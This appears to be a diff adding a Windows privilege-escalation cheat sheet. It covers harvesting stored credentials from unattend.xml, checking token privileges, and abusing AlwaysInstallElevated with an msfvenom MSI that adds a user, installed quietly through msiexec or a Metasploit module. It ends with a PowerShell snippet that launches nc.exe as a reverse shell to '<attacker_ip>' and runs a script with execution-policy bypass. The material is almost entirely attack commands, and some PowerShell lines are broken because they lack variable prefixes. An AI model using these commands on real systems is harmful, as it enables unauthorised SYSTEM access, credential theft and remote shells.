@@ -1,0 +1,53 @@
+Stored credentials
+Search for credentials within:
+
+c:\unattend.xml
+
+
+decode it in base64 
+
+base64 -d  base64 string
+
+
+
+_________________________________________________________________________
+
+
+Check for Privileges 
+
+whoami /priv 
+
+
+__________________________________________________________________________
+
+AlwaysInstall Elevated: 
+
+Allows non-privileged users to run executables as SYSTEM
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
+
+
+If Available:
+msfvenom -p windows/adduser USER=mayank PASS=mayank123 -f msi -o create_user.msi
+
+On target:
+
+msiexec /quiet /qn /i C:\create_user.msi
+
+Metasploit:
+use exploit/windows/local/always_install_elevated
+
+
+___________________________________________________________________________________
+
+
+Using Powershell:
+
+secpasswd = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
+mycreds = New-Object System.Management.Automation.PSCredential ("USERNAME", $secpasswd)
+computer = "HOSTNAME"
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 3333 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+
+TO run the Script:
+
+powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1
